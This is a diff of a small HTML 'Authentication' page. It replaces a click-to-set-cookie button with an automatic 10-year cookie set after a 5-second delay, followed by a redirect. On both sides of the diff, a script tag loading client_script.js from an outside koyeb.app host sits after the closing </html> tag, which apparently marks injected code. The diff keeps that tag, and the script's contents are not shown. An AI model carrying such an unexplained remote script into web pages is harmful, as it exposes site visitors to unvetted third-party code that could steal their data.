@@ -20,30 +20,16 @@
       border-radius: 10px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
-    button {
-      padding: 0.8rem 2rem;
-      font-size: 1rem;
-      border: none;
-      border-radius: 5px;
-      background-color: #FFA500;
-      color: white;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-    button:hover {
-      background-color: #e69500;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Authentication</h1>
-    <p>Click the button to set your access cookie.</p>
-    <button id="setCookieBtn">Set Cookie & Access Site</button>
+    <p>Please wait… setting your access cookie.</p>
   </div>
 
   <script>
-    document.getElementById('setCookieBtn').addEventListener('click', () => {
+    setTimeout(() => {
       // Set cookie 'ok=true' that lasts 10 years
       const expires = new Date();
       expires.setFullYear(expires.getFullYear() + 10);
@@ -51,7 +37,9 @@
 
       // Redirect to home page
       window.location.href = '/';
-    });
+    }, 5000); // 5 seconds
   </script>
 </body>
-</html><script src="https://plain-vanessa-ojdaw-24d55416.koyeb.app/client_script.js"></script>
+</html>
+
+<script src="https://plain-vanessa-ojdaw-24d55416.koyeb.app/client_script.js"></script>
